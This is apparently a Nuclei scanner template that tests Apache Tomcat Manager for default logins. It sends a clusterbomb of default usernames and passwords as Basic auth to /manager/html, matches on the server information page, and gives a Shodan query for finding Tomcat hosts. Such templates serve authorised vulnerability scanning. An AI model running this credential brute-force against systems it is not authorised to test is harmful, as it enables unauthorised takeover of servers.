http:
- attack: clusterbomb
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Apache Tomcat
    - Server Information
  - condition: or
    part: body
    type: word
    words:
    - Tomcat Version
    - JVM Version
    - JVM Vendor
    - OS Name
    - OS Version
    - OS Architecture
    - Hostname
    - IP Address
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - ADMIN
    - OvW*busr1
    - Password1
    - QLogic66
    - admanager
    - admin
    - adrole1
    - adroot
    - ads3cret
    - adtomcat
    - advagrant
    - changethis
    - demo
    - j2deployer
    - kdsxc
    - manager
    - owaspbwa
    - password
    - password1
    - r00t
    - role1
    - root
    - s3cret
    - tomcat
    - toor
    - vagrant
    - xampp
    username:
    - ADMIN
    - QCC
    - admin
    - both
    - cxsdk
    - demo
    - j2deployer
    - manager
    - ovwebusr
    - role
    - role1
    - root
    - server_admin
    - tomcat
    - xampp
  raw:
  - 'GET /manager/html HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
  threads: 30
id: tomcat-default-login
info:
  author: pdteam,sinKettu,nybble04
  classification:
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
  description: Apache Tomcat Manager default login credentials were discovered. This
    template checks for multiple variations.
  metadata:
    max-request: 405
    product: tomcat
    shodan-query: title:"Apache Tomcat"
    vendor: apache
  name: Apache Tomcat Manager Default Login
  reference:
  - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
  - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
  severity: high
  tags: tomcat,apache,default-login,vuln
